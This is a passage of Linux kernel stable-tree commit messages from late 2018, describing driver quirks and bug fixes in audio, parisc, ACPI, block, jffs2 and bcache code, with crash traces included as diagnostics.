Cc: Andrea Arcangeli
Cc: "WoodhouseDavid"
Cc: Andi Kleen
Cc: Tim Chen
Cc: "SchauflerCasey"
Cc: stable@vger.kernel.org
Link: https://lkml.kernel.org/r/nycvar.YFH.7.76.1809251438240.15880@cbobk.fhfr.pm
Signed-off-by: Greg Kroah-Hartman
commit e5e99bd18db35cc96c06b6d0066749a103bbe430
Author: Alex Stanoev
Date: Sun Oct 28 16:55:12 2018 +0000
ALSA: ca0106: Disable IZD on SB0570 DAC to fix audio pops
commit ac237c28d5ac1b241d58b1b7b4b9fa10efb22fb5 upstream.
The Creative Audigy SE (SB0570) card currently exhibits an audible pop
whenever playback is stopped or resumed, or during silent periods of an
audio stream. Initialise the IZD bit to the 0 to eliminate these pops.
The Infinite Zero Detection (IZD) feature on the DAC causes the output
to be shunted to Vcap after 2048 samples of silence. This discharges the
AC coupling capacitor through the output and causes the aforementioned
pop/click noise.
The behaviour of the IZD bit is described on page 15 of the WM8768GEDS
datasheet: "With IZD=1, applying MUTE for 1024 consecutive input samples
will cause all outputs to be connected directly to VCAP. This also
happens if 2048 consecutive zero input samples are applied to all 6
channels, and IZD=0. It will be removed as soon as any channel receives
a non-zero input". I believe the second sentence might be referring to
IZD=1 instead of IZD=0 given the observed behaviour of the card.
This change should make the DAC initialisation consistent with
Creative's Windows driver, as this popping persists when initialising
the card in Linux and soft rebooting into Windows, but is not present on
a cold boot to Windows.
Signed-off-by: Alex Stanoev
Cc:
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 9c30febb738374921ca103511172309f790b6132
Author: Hans de Goede
Date: Tue Oct 16 12:18:21 2018 +0200
ALSA: hda: Add 2 more models to the power\_save blacklist
commit 5cb6b5fc013ee711d19bfc4e9deb8d6ae80741db upstream.
Power-saving is causing plops on audio start/stop on Dell Precision T3600
laptops and Intel DZ77BH boards, add these to the power\_save blacklist.
BugLink: https://bugzilla.redhat.com/show\_bug.cgi?id=1525104
Signed-off-by: Hans de Goede
Cc:
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 0cfca999ee945a05ac04a4ac9ad96cf6accd4609
Author: Jeremy Cline
Date: Thu Oct 11 15:49:17 2018 -0400
ALSA: hda - Add mic quirk for the Lenovo G50-30 (17aa:3905)
commit e7bb6ad5685f05685dd8a6a5eda7bfcd14d5f95b upstream.
The Lenovo G50-30, like other G50 models, has a Conexant codec that
requires a quirk for its inverted stereo dmic.
Bugzilla: https://bugzilla.redhat.com/show\_bug.cgi?id=1249364
Reported-by: Alexander Ploumistos
Tested-by: Alexander Ploumistos
Cc: stable@vger.kernel.org
Signed-off-by: Jeremy Cline
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 43a57738232c31a5955eda6cd4e69af642d01b41
Author: Hui Wang
Date: Wed Oct 10 11:57:25 2018 +0800
ALSA: hda/realtek - Fix the problem of the front MIC on the Lenovo M715
commit d06fb562bff5d14defdacbd92449bacbaedd5cdf upstream.
The front MIC on the Lenovo M715 can't record sound, after applying
the ALC294\_FIXUP\_LENOVO\_MIC\_LOCATION, the problem is fixed. So add
the pin configuration of this machine to the pin quirk table.
Cc:
Signed-off-by: Hui Wang
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 9580bd128c3b6d67a77a10937994fff766ee4b8b
Author: Takashi Iwai
Date: Tue Oct 9 14:20:17 2018 +0200
ALSA: hda - Fix headphone pin config for ASUS G751
commit 5b7c5e1f4c36b99d0f694f38b9ad910f520cb7ef upstream.
BIOS on ASUS G751 doesn't seem to map the headphone pin (NID 0x16)
correctly. Add a quirk to address it, as well as chaining to the
previous fix for the microphone.
Reported-by: Håvard
Cc:
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 618ad7fe0e41401baa75025d2fad2f6eb3d0cee5
Author: Takashi Iwai
Date: Sun Oct 7 09:44:17 2018 +0200
ALSA: hda - Add quirk for ASUS G751 laptop
commit 11ba6111160290ccd35562f4e05cec08942a6c4c upstream.
ASUS G751 requires the extra COEF initialization to make it microphone
working properly.
Reported-and-tested-by: Håvard
Cc:
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 1396c159647a058dc1714491bc37dad67db1468f
Author: Helge Deller
Date: Sun Oct 14 21:58:00 2018 +0200
parisc: Fix exported address of os\_hpmc handler
commit 99a3ae51d557d8e38a7aece65678a31f9db215ee upstream.
In the C-code we need to put the physical address of the hpmc handler in
the interrupt vector table (IVA) in order to get HPMCs working. Since
on parisc64 function pointers are indirect (in fact they are function
descriptors) we instead export the address as variable and not as
function.
This reverts a small part of commit f39cce654f9a ("parisc: Add
cfi\_startproc and cfi\_endproc to assembly code").
Signed-off-by: Helge Deller
Cc:  [4.9+]
Signed-off-by: Greg Kroah-Hartman
commit 5e3efb6ff698451300b6a7fb6b78b9b19061de3e
Author: Helge Deller
Date: Fri Oct 12 22:37:46 2018 +0200
parisc: Fix map\_pages() to not overwrite existing pte entries
commit 3c229b3f2dd8133f61bb81d3cb018be92f4bba39 upstream.
Fix a long-existing small nasty bug in the map\_pages() implementation which
leads to overwriting already written pte entries with zero, \*if\* map\_pages() is
called a second time with an end address which isn't aligned on a pmd boundry.
This happens for example if we want to remap only the text segment read/write
in order to run alternative patching on the code. Exiting the loop when we
reach the end address fixes this.
Cc: stable@vger.kernel.org
Signed-off-by: Helge Deller
Signed-off-by: Greg Kroah-Hartman
commit d9ad0ecfd50338d8a3deb69c6dc942f510a1813a
Author: John David Anglin
Date: Sat Oct 6 13:11:30 2018 -0400
parisc: Fix address in HPMC IVA
commit 1138b6718ff74d2a934459643e3754423d23b5e2 upstream.
Helge noticed that the address of the os\_hpmc handler was not being
correctly calculated in the hpmc macro. As a result, PDCE\_CHECK would
fail to call os\_hpmc:
 e800009802e00000 0000000000000000 CC\_ERR\_CHECK\_HPMC
 37000f7302e00000 8040004000000000 CC\_ERR\_CPU\_CHECK\_SUMMARY
 f600105e02e00000 fffffff0f0c00000 CC\_MC\_HPMC\_MONARCH\_SELECTED
 140003b202e00000 000000000000000b CC\_ERR\_HPMC\_STATE\_ENTRY
 5600100b02e00000 00000000000001a0 CC\_MC\_OS\_HPMC\_LEN\_ERR
 5600106402e00000 fffffff0f0438e70 CC\_MC\_BR\_TO\_OS\_HPMC\_FAILED
 e800009802e00000 0000000000000000 CC\_ERR\_CHECK\_HPMC
 37000f7302e00000 8040004000000000 CC\_ERR\_CPU\_CHECK\_SUMMARY
 4000109f02e00000 0000000000000000 CC\_MC\_HPMC\_INITIATED
 4000101902e00000 0000000000000000 CC\_MC\_MULTIPLE\_HPMCS
 030010d502e00000 0000000000000000 CC\_CPU\_STOP
The address problem can be seen by dumping the fault vector:
0000000040159000 :
40159000: 63 6f 77 73 stb r15,-2447(dp)
40159004: 20 63 61 6e ldil L%b747000,r3
40159008: 20 66 6c 79 ldil L%-1c3b3000,r3
...
40159020: 08 00 02 40 nop
40159024: 20 6e 60 02 ldil L%15d000,r3
40159028: 34 63 00 00 ldo 0(r3),r3
4015902c: e8 60 c0 02 bv,n r0(r3)
40159030: 08 00 02 40 nop
40159034: 00 00 00 00 break 0,0
40159038: c0 00 70 00 bb,\*< r0,sar,40159840
4015903c: 00 00 00 00 break 0,0
Location 40159038 should contain the physical address of os\_hpmc:
000000004015d000 :
4015d000: 08 1a 02 43 copy r26,r3
4015d004: 01 c0 08 a4 mfctl iva,r4
4015d008: 48 85 00 68 ldw 34(r4),r5
This patch moves the address setup into initialize\_ivt to resolve the
above problem. I tested the change by dumping the HPMC entry after setup:
0000000040209020: 8000240
0000000040209024: 206a2004
0000000040209028: 34630ac0
000000004020902c: e860c002
0000000040209030: 8000240
0000000040209034: 1bdddce6
0000000040209038: 15d000
000000004020903c: 1a0
Signed-off-by: John David Anglin
Cc:
Signed-off-by: Helge Deller
Signed-off-by: Greg Kroah-Hartman
commit acf2f1783055c829622d7db89bebac883916c7e3
Author: Dan Williams
Date: Sat Oct 13 20:32:17 2018 -0700
acpi, nfit: Fix Address Range Scrub completion tracking
commit d3abaf43bab8d5b0a3c6b982100d9e2be96de4ad upstream.
The Address Range Scrub implementation tried to skip running scrubs
against ranges that were already scrubbed by the BIOS. Unfortunately
that support also resulted in early scrub completions as evidenced by
this debug output from nfit\_test:
nd\_region region9: ARS: range 1 short complete
nd\_region region3: ARS: range 1 short complete
nd\_region region4: ARS: range 2 ARS start (0)
nd\_region region4: ARS: range 2 short complete
...i.e. completions without any indications that the scrub was started.
This state of affairs was hard to see in the code due to the
proliferation of state bits and mistakenly trying to track done state
per-range when the completion is a global property of the bus.
So, kill the four ARS state bits (ARS\_REQ, ARS\_REQ\_REDO, ARS\_DONE, and
ARS\_SHORT), and replace them with just 2 request flags ARS\_REQ\_SHORT and
ARS\_REQ\_LONG. The implementation will still complete and reap the
results of BIOS initiated ARS, but it will not attempt to use that
information to affect the completion status of scrubbing the ranges from
a Linux perspective.
Instead, try to synchronously run a short ARS per range at init time and
schedule a long scrub in the background. If ARS is busy with an ARS
request, schedule both a short and a long scrub for when ARS returns to
idle. This logic also satisfies the intent of what ARS\_REQ\_REDO was
trying to achieve. The new rule is that the REQ flag stays set until the
next successful ars\_start() for that range.
With the new policy that the REQ flags are not cleared until the next
start, the implementation no longer loses requests as can be seen from
the following log:
nd\_region region3: ARS: range 1 ARS start short (0)
nd\_region region9: ARS: range 1 ARS start short (0)
nd\_region region3: ARS: range 1 complete
nd\_region region4: ARS: range 2 ARS start short (0)
nd\_region region9: ARS: range 1 complete
nd\_region region9: ARS: range 1 ARS start long (0)
nd\_region region4: ARS: range 2 complete
nd\_region region3: ARS: range 1 ARS start long (0)
nd\_region region9: ARS: range 1 complete
nd\_region region3: ARS: range 1 complete
nd\_region region4: ARS: range 2 ARS start long (0)
nd\_region region4: ARS: range 2 complete
...note that the nfit\_test emulated driver provides 2 buses, that is why
some of the range indices are duplicated. Notice that each range
now successfully completes a short and long scrub.
Cc:
Fixes: 14c73f997a5e ("nfit, address-range-scrub: introduce nfit\_spa->ars\_state")
Fixes: cc3d3458d46f ("acpi/nfit: queue issuing of ars when an uc error...")
Reported-by: Jacek Zloch
Reported-by: Krzysztof Rusocki
Reviewed-by: Dave Jiang
Signed-off-by: Dan Williams
Signed-off-by: Greg Kroah-Hartman
commit cf7d33fa2dd36fa0d6a98833024f1632f357f9cf
Author: David Arcari
Date: Mon Aug 27 15:19:08 2018 -0400
mailbox: PCC: handle parse error
commit afd0b1fb22269f48d68fdf269891c653818c8047 upstream.
acpi\_pcc\_probe() calls acpi\_table\_parse\_entries\_array() but fails
to check for an error return. This in turn can result in calling
kcalloc() with a negative count as well as emitting the following
misleading erorr message:
[ 2.642015] Could not allocate space for PCC mbox channels
Fixes: 8f8027c5f935 (mailbox: PCC: erroneous error message when parsing ACPI PCCT)
Signed-off-by: David Arcari
Reviewed-by: Al Stone
Cc: 4.18+  # 4.18+
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Greg Kroah-Hartman
commit f703cf73a0cdb3c833c219cb79a829abb6c2432b
Author: Jan Glauber
Date: Thu Oct 11 12:13:01 2018 +0200
ipmi: Fix timer race with module unload
commit 0711e8c1b4572d076264e71b0002d223f2666ed7 upstream.
Please note that below oops is from an older kernel, but the same
race seems to be present in the upstream kernel too.
---8<---
The following panic was encountered during removing the ipmi\_ssif
module:
[ 526.352555] Unable to handle kernel paging request at virtual address ffff000006923090
[ 526.360464] Mem abort info:
[ 526.363257] ESR = 0x86000007
[ 526.366304] Exception class = IABT (current EL), IL = 32 bits
[ 526.372221] SET = 0, FnV = 0
[ 526.375269] EA = 0, S1PTW = 0
[ 526.378405] swapper pgtable: 4k pages, 48-bit VAs, pgd = 000000008ae60416
[ 526.385185] [ffff000006923090] \*pgd=000000bffcffe803, \*pud=000000bffcffd803, \*pmd=0000009f4731a003, \*pte=0000000000000000
[ 526.396141] Internal error: Oops: 86000007 [#1] SMP
[ 526.401008] Modules linked in: nls\_iso8859\_1 ipmi\_devintf joydev input\_leds ipmi\_msghandler shpchp sch\_fq\_codel ib\_iser rdma\_cm iw\_cm ib\_cm ib\_core iscsi\_tcp libiscsi\_tcp libiscsi scsi\_transport\_iscsi ip\_tables x\_tables autofs4 btrfs zstd\_compress raid10 raid456 async\_raid6\_recov async\_memcpy async\_pq async\_xor async\_tx xor raid6\_pq libcrc32c raid1 raid0 multipath linear i2c\_smbus hid\_generic usbhid uas hid usb\_storage ast aes\_ce\_blk i2c\_algo\_bit aes\_ce\_cipher qede ttm crc32\_ce ptp crct10dif\_ce drm\_kms\_helper ghash\_ce syscopyarea sha2\_ce sysfillrect sysimgblt pps\_core fb\_sys\_fops sha256\_arm64 sha1\_ce mpt3sas qed drm raid\_class ahci scsi\_transport\_sas libahci gpio\_xlp i2c\_xlp9xx aes\_neon\_bs aes\_neon\_blk crypto\_simd cryptd aes\_arm64 [last unloaded: ipmi\_ssif]
[ 526.468085] CPU: 125 PID: 0 Comm: swapper/125 Not tainted 4.15.0-35-generic #38~lp1775396+build.1
[ 526.476942] Hardware name: To be filled by O.E.M. Saber/Saber, BIOS 0ACKL022 08/14/2018
[ 526.484932] pstate: 00400009 (nzcv daif +PAN -UAO)
[ 526.489713] pc : 0xffff000006923090
[ 526.493198] lr : call\_timer\_fn+0x34/0x178
[ 526.497194] sp : ffff000009b0bdd0
[ 526.500496] x29: ffff000009b0bdd0 x28: 0000000000000082
[ 526.505796] x27: 0000000000000002 x26: ffff000009515188
[ 526.511096] x25: ffff000009515180 x24: ffff0000090f1018
[ 526.516396] x23: ffff000009519660 x22: dead000000000200
[ 526.521696] x21: ffff000006923090 x20: 0000000000000100
[ 526.526995] x19: ffff809eeb466a40 x18: 0000000000000000
[ 526.532295] x17: 000000000000000e x16: 0000000000000007
[ 526.537594] x15: 0000000000000000 x14: 071c71c71c71c71c
[ 526.542894] x13: 0000000000000000 x12: 0000000000000000
[ 526.548193] x11: 0000000000000001 x10: ffff000009b0be88
[ 526.553493] x9 : 0000000000000000 x8 : 0000000000000005
[ 526.558793] x7 : ffff80befc1f8528 x6 : 0000000000000020
[ 526.564092] x5 : 0000000000000040 x4 : 0000000020001b20
[ 526.569392] x3 : 0000000000000000 x2 : ffff809eeb466a40
[ 526.574692] x1 : ffff000006923090 x0 : ffff809eeb466a40
[ 526.579992] Process swapper/125 (pid: 0, stack limit = 0x000000002eb50acc)
[ 526.586854] Call trace:
[ 526.589289] 0xffff000006923090
[ 526.592419] expire\_timers+0xc8/0x130
[ 526.596070] run\_timer\_softirq+0xec/0x1b0
[ 526.600070] \_\_do\_softirq+0x134/0x328
[ 526.603726] irq\_exit+0xc8/0xe0
[ 526.606857] \_\_handle\_domain\_irq+0x6c/0xc0
[ 526.610941] gic\_handle\_irq+0x84/0x188
[ 526.614679] el1\_irq+0xe8/0x180
[ 526.617822] cpuidle\_enter\_state+0xa0/0x328
[ 526.621993] cpuidle\_enter+0x34/0x48
[ 526.625564] call\_cpuidle+0x44/0x70
[ 526.629040] do\_idle+0x1b8/0x1f0
[ 526.632256] cpu\_startup\_entry+0x2c/0x30
[ 526.636174] secondary\_start\_kernel+0x11c/0x130
[ 526.640694] Code: bad PC value
[ 526.643800] ---[ end trace d020b0b8417c2498 ]---
[ 526.648404] Kernel panic - not syncing: Fatal exception in interrupt
[ 526.654778] SMP: stopping secondary CPUs
[ 526.658734] Kernel Offset: disabled
[ 526.662211] CPU features: 0x5800c38
[ 526.665688] Memory Limit: none
[ 526.668768] ---[ end Kernel panic - not syncing: Fatal exception in interrupt
Prevent mod\_timer from arming a timer that was already removed by
del\_timer during module unload.
Signed-off-by: Jan Glauber
Cc:  # 3.19
Signed-off-by: Corey Minyard
Signed-off-by: Greg Kroah-Hartman
commit 13b8c2e55d7baab2cde0452374adcb3769873995
Author: Masami Hiramatsu
Date: Sat Oct 20 18:47:53 2018 +0900
kprobes/x86: Use preempt\_enable() in optimized\_callback()
commit 2e62024c265aa69315ed02835623740030435380 upstream.
The following commit:
a19b2e3d7839 ("kprobes/x86: Remove IRQ disabling from ftrace-based/optimized kprobes”)
removed local\_irq\_save/restore() from optimized\_callback(), the handler
might be interrupted by the rescheduling interrupt and might be
rescheduled - so we must not use the preempt\_enable\_no\_resched() macro.
Use preempt\_enable() instead, to not lose preemption events.
[ mingo: Improved the changelog. ]
Reported-by: Nadav Amit
Signed-off-by: Masami Hiramatsu
Acked-by: Peter Zijlstra (Intel)
Cc:
Cc: Alexei Starovoitov
Cc: Andy Lutomirski
Cc: Borislav Petkov
Cc: Linus Torvalds
Cc: Oleg Nesterov
Cc: Thomas Gleixner
Cc: dwmw@amazon.co.uk
Fixes: a19b2e3d7839 ("kprobes/x86: Remove IRQ disabling from ftrace-based/optimized kprobes”)
Link: http://lkml.kernel.org/r/154002887331.7627.10194920925792947001.stgit@devbox
Signed-off-by: Ingo Molnar
Signed-off-by: Greg Kroah-Hartman
commit 5ef3e6e8d3e611518caf55f8045078ce1aad7b12
Author: Erik Schmauss
Date: Wed Oct 17 14:20:51 2018 -0700
ACPICA: AML Parser: fix parse loop to correctly skip erroneous extended opcodes
commit c64baa3a6fa207d112706bc5e7fd645cd8a8663f upstream.
AML opcodes come in two lengths: 1-byte opcodes and 2-byte, extended opcodes.
If an error occurs due to illegal opcodes during table load, the AML parser
needs to continue loading the table. In order to do this, it needs to skip
parsing of the offending opcode and operands associated with that opcode.
This change fixes the AML parse loop to correctly skip parsing of incorrect
extended opcodes. Previously, only the short opcodes were skipped correctly.
Signed-off-by: Erik Schmauss
Cc: All applicable
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Greg Kroah-Hartman
commit 7876d54ad642fbbd1857d37528aa1ec8c5a2c592
Author: Erik Schmauss
Date: Wed Oct 17 14:09:35 2018 -0700
ACPICA: AML interpreter: add region addresses in global list during initialization
commit 4abb951b73ff0a8a979113ef185651aa3c8da19b upstream.
The table load process omitted adding the operation region address
range to the global list. This omission is problematic because the OS
queries the global list to check for address range conflicts before
deciding which drivers to load. This commit may result in warning
messages that look like the following:
[ 7.871761] ACPI Warning: system\_IO range 0x00000428-0x0000042F conflicts with op\_region 0x00000400-0x0000047F (\PMIO) (20180531/utaddress-213)
[ 7.871769] ACPI: If an ACPI driver is available for this device, you should use it instead of the native driver
However, these messages do not signify regressions. It is a result of
properly adding address ranges within the global address list.
Link: https://bugzilla.kernel.org/show\_bug.cgi?id=200011
Tested-by: Jean-Marc Lenoir
Signed-off-by: Erik Schmauss
Cc: All applicable
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Greg Kroah-Hartman
commit 165ec328038dcd71fdf19b93f02cfeb367efd1f5
Author: Bart Van Assche
Date: Wed Oct 17 13:24:56 2018 -0700
ACPI / OSL: Use 'jiffies' as the time bassis for acpi\_os\_get\_timer()
commit 83b2348e2755db48fa8f40fdb791f366fabc0ba0 upstream.
Since acpi\_os\_get\_timer() may be called after the timer subsystem has
been suspended, use the jiffies counter instead of ktime\_get(). This
patch avoids that the following warning is reported during hibernation:
WARNING: CPU: 0 PID: 612 at kernel/time/timekeeping.c:751 ktime\_get+0x116/0x120
RIP: 0010:ktime\_get+0x116/0x120
Call Trace:
acpi\_os\_get\_timer+0xe/0x30
acpi\_ds\_exec\_begin\_control\_op+0x175/0x1de
acpi\_ds\_exec\_begin\_op+0x2c7/0x39a
acpi\_ps\_create\_op+0x573/0x5e4
acpi\_ps\_parse\_loop+0x349/0x1220
acpi\_ps\_parse\_aml+0x25b/0x6da
acpi\_ps\_execute\_method+0x327/0x41b
acpi\_ns\_evaluate+0x4e9/0x6f5
acpi\_ut\_evaluate\_object+0xd9/0x2f2
acpi\_rs\_get\_method\_data+0x8f/0x114
acpi\_walk\_resources+0x122/0x1b6
acpi\_pci\_link\_get\_current.isra.2+0x157/0x280
acpi\_pci\_link\_set+0x32f/0x4a0
irqrouter\_resume+0x58/0x80
syscore\_resume+0x84/0x380
hibernation\_snapshot+0x20c/0x4f0
hibernate+0x22d/0x3a6
state\_store+0x99/0xa0
kobj\_attr\_store+0x37/0x50
sysfs\_kf\_write+0x87/0xa0
kernfs\_fop\_write+0x1a5/0x240
\_\_vfs\_write+0xd2/0x410
vfs\_write+0x101/0x250
ksys\_write+0xab/0x120
\_\_x64\_sys\_write+0x43/0x50
do\_syscall\_64+0x71/0x220
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
Fixes: 164a08cee135 (ACPICA: Dispatcher: Introduce timeout mechanism for infinite loop detection)
Reported-by: Fengguang Wu
References: https://lists.01.org/pipermail/lkp/2018-April/008406.html
Signed-off-by: Bart Van Assche
Cc: 4.16+  # 4.16+
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Greg Kroah-Hartman
commit 9c869687da7c5e276e277b0534f2b70bebcc85c1
Author: Maciej S. Szmigiero
Date: Sun Sep 9 01:21:06 2018 +0200
pcmcia: Implement CLKRUN protocol disabling for Ricoh bridges
commit 95691e3eddc41da2d1cd3cca51fecdfb46bd85bc upstream.
Currently, "disable\_clkrun" yenta\_socket module parameter is only
implemented for TI CardBus bridges.
Add also an implementation for Ricoh bridges that have the necessary
setting documented in publicly available datasheets.
Tested on a RL5C476II with a Sunrich C-160 CardBus NIC that doesn't work
correctly unless the CLKRUN protocol is disabled.
Let's also make it clear in its description that the "disable\_clkrun"
module parameter only works on these two previously mentioned brands of
CardBus bridges.
Signed-off-by: Maciej S. Szmigiero
Cc: stable@vger.kernel.org
Signed-off-by: Dominik Brodowski
Signed-off-by: Greg Kroah-Hartman
commit 6457bbfb62d858442230ddd5457c98568bca2cf3
Author: He Zhe
Date: Mon Sep 17 11:24:20 2018 +0800
dma-mapping: fix panic caused by passing empty cma command line argument
commit a3ceed87b07769fb80ce9dc6b604e515dba14c4b upstream.
early\_cma does not check input argument before passing it to
simple\_strtoull. The argument would be a NULL pointer if "cma", without
its value, is set in command line and thus causes the following panic.
PANIC: early exception 0xe3 IP 10:ffffffffa3e9db8d error 0 cr2 0x0
[ 0.000000] CPU: 0 PID: 0 Comm: swapper Not tainted 4.19.0-rc3-yocto-standard+ #7
[ 0.000000] RIP: 0010:\_parse\_integer\_fixup\_radix+0xd/0x70
...
[ 0.000000] Call Trace:
[ 0.000000] simple\_strtoull+0x29/0x70
[ 0.000000] memparse+0x26/0x90
[ 0.000000] early\_cma+0x17/0x6a
[ 0.000000] do\_early\_param+0x57/0x8e
[ 0.000000] parse\_args+0x208/0x320
[ 0.000000] ? rdinit\_setup+0x30/0x30
[ 0.000000] parse\_early\_options+0x29/0x2d
[ 0.000000] ? rdinit\_setup+0x30/0x30
[ 0.000000] parse\_early\_param+0x36/0x4d
[ 0.000000] setup\_arch+0x336/0x99e
[ 0.000000] start\_kernel+0x6f/0x4e6
[ 0.000000] x86\_64\_start\_reservations+0x24/0x26
[ 0.000000] x86\_64\_start\_kernel+0x6f/0x72
[ 0.000000] secondary\_startup\_64+0xa4/0xb0
This patch adds a check to prevent the panic.
Signed-off-by: He Zhe
Reviewed-by: Marek Szyprowski
Cc: stable@vger.kernel.org
Signed-off-by: Christoph Hellwig
Signed-off-by: Greg Kroah-Hartman
commit 6995a939af68986955b3b8d9b84aa86f1778f3e2
Author: Rafael J. Wysocki
Date: Mon Oct 15 23:21:05 2018 +0200
cpufreq: conservative: Take limits changes into account properly
commit da5e79bc70b84971d2b3a55fb252e34e51d81d48 upstream.
If the policy limits change between invocations of cs\_dbs\_update(),
the requested frequency value stored in dbs\_info may not be updated
and the function may use a stale value of it next time. Moreover, if
idle periods are takem into account by cs\_dbs\_update(), the requested
frequency value stored in dbs\_info may be below the min policy limit,
which is incorrect.
To fix these problems, always update the requested frequency value
in dbs\_info along with the local copy of it when the previous
requested frequency is beyond the policy limits and avoid decreasing
the requested frequency below the min policy limit when taking
idle periods into account.
Fixes: abb6627910a1 (cpufreq: conservative: Fix next frequency selection)
Fixes: 00bfe05889e9 (cpufreq: conservative: Decrease frequency faster for deferred updates)
Reported-by: Waldemar Rymarkiewicz
Cc: All applicable
Signed-off-by: Rafael J. Wysocki
Acked-by: Waldemar Rymarkiewicz
Acked-by: Viresh Kumar
Signed-off-by: Greg Kroah-Hartman
commit f793bede6a923a81db55191fc6c958951bf369bf
Author: Ming Lei
Date: Mon Oct 29 20:57:19 2018 +0800
block: make sure writesame bio is aligned with logical block size
commit 34ffec60b27aa81d04e274e71e4c6ef740f75fc7 upstream.
Obviously the created writesame bio has to be aligned with logical block
size, and use bio\_allowed\_max\_sectors() to retrieve this number.
Cc: stable@vger.kernel.org
Cc: Mike Snitzer
Cc: Christoph Hellwig
Cc: Xiao Ni
Cc: Mariusz Dabrowski
Fixes: b49a0871be31a745b2ef ("block: remove split code in blkdev\_issue\_{discard,write\_same}")
Tested-by: Rui Salvaterra
Signed-off-by: Ming Lei
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit 1e660a354aaa1d2a58f788a48212886c1eed8e52
Author: Ming Lei
Date: Mon Oct 29 20:57:17 2018 +0800
block: make sure discard bio is aligned with logical block size
commit 1adfc5e4136f5967d591c399aff95b3b035f16b7 upstream.
Obviously the created discard bio has to be aligned with logical block size.
This patch introduces the helper of bio\_allowed\_max\_sectors() for
this purpose.
Cc: stable@vger.kernel.org
Cc: Mike Snitzer
Cc: Christoph Hellwig
Cc: Xiao Ni
Cc: Mariusz Dabrowski
Fixes: 744889b7cbb56a6 ("block: don't deal with discard limit in blkdev\_issue\_discard()")
Fixes: a22c4d7e34402cc ("block: re-add discard\_granularity and alignment checks")
Reported-by: Rui Salvaterra
Tested-by: Rui Salvaterra
Signed-off-by: Ming Lei
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit 5d7cc07a4a0958c0e4045bdf33265d93d0250f60
Author: Ming Lei
Date: Fri Oct 12 15:53:10 2018 +0800
block: don't deal with discard limit in blkdev\_issue\_discard()
commit 744889b7cbb56a64f957e65ade7cb65fe3f35714 upstream.
blk\_queue\_split() does respect this limit via bio splitting, so no
need to do that in blkdev\_issue\_discard(), then we can align to
normal bio submit(bio\_add\_page() & submit\_bio()).
More importantly, this patch fixes one issue introduced in a22c4d7e34402cc
("block: re-add discard\_granularity and alignment checks"), in which
zero discard bio may be generated in case of zero alignment.
Fixes: a22c4d7e34402ccdf3 ("block: re-add discard\_granularity and alignment checks")
Cc: stable@vger.kernel.org
Cc: Ming Lin
Cc: Mike Snitzer
Cc: Christoph Hellwig
Cc: Xiao Ni
Tested-by: Mariusz Dabrowski
Signed-off-by: Ming Lei
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit 9acb7e6aa615850af7b320a0378989ee64eb017a
Author: Jens Axboe
Date: Sun Oct 21 12:02:36 2018 -0600
block: setup bounce bio\_sets properly
commit 52990a5fb0c991ecafebdab43138b5ed41376852 upstream.
We're only setting up the bounce bio sets if we happen
to need bouncing for regular HIGHMEM, not if we only need
it for ISA devices.
Protect the ISA bounce setup with a mutex, since it's
being invoked from driver init functions and can thus be
called in parallel.
Cc: stable@vger.kernel.org
Reported-by: Ondrej Zary
Tested-by: Ondrej Zary
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit 22315bd1693b3c29abc065dcf6c1a10310fa9f7b
Author: Hou Tao
Date: Sat Oct 6 17:09:35 2018 +0800
jffs2: free jffs2\_sb\_info through jffs2\_kill\_sb()
commit 92e2921f7eee63450a5f953f4b15dc6210219430 upstream.
When an invalid mount option is passed to jffs2, jffs2\_parse\_options()
will fail and jffs2\_sb\_info will be freed, but then jffs2\_sb\_info will
be used (use-after-free) and freeed (double-free) in jffs2\_kill\_sb().
Fix it by removing the buggy invocation of kfree() when getting invalid
mount options.
Fixes: 92abc475d8de ("jffs2: implement mount option parsing and compression overriding")
Cc: stable@kernel.org
Signed-off-by: Hou Tao
Reviewed-by: Richard Weinberger
Signed-off-by: Boris Brezillon
Signed-off-by: Greg Kroah-Hartman
commit 4e0b30d873232b59da3c562b8704ca5e647a8396
Author: Dmitry Bazhenov
Date: Mon Oct 15 14:21:22 2018 +0500
hwmon: (pmbus) Fix page count auto-detection.
commit e7c6a55606b5c46b449d76588968b4d8caae903f upstream.
Devices with compatible="pmbus" field have zero initial page count,
and pmbus\_clear\_faults() being called before the page count auto-
detection does not actually clear faults because it depends on the
page count. Non-cleared faults in its turn may fail the subsequent
page count auto-detection.
This patch fixes this problem by calling pmbus\_clear\_fault\_page()
for currently set page and calling pmbus\_clear\_faults() after the
page count was detected.
Cc: stable@vger.kernel.org
Signed-off-by: Dmitry Bazhenov
Signed-off-by: Guenter Roeck
Signed-off-by: Greg Kroah-Hartman
commit 79e8dc743d124eebf53304287a158030f255cb97
Author: Tang Junhui
Date: Mon Oct 8 20:41:14 2018 +0800
bcache: fix miss key refill->end in writeback
commit 2d6cb6edd2c7fb4f40998895bda45006281b1ac5 upstream.
refill->end record the last key of writeback, for example, at the first
time, keys (1,128K) to (1,1024K) are flush to the backend device, but
the end key (1,1024K) is not included, since the bellow code:
if (bkey\_cmp(k, refill->end) >= 0) {
ret = MAP\_DONE;
goto out;
}
And in the next time when we refill writeback keybuf again, we searched
key start from (1,1024K), and got a key bigger than it, so the key
(1,1024K) missed.
This patch modify the above code, and let the end key to be included to
the writeback key buffer.
Signed-off-by: Tang Junhui
Cc: stable@vger.kernel.org
Signed-off-by: Coly Li
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit c483d0e293af6bdef609dcd3b0690858c4c568a5
Author: Tang Junhui
Date: Mon Oct 8 20:41:12 2018 +0800
bcache: correct dirty data statistics
commit 2e17a262a2371d38d2ec03614a2675a32cef9912 upstream.
When bcache device is clean, dirty keys may still exist after
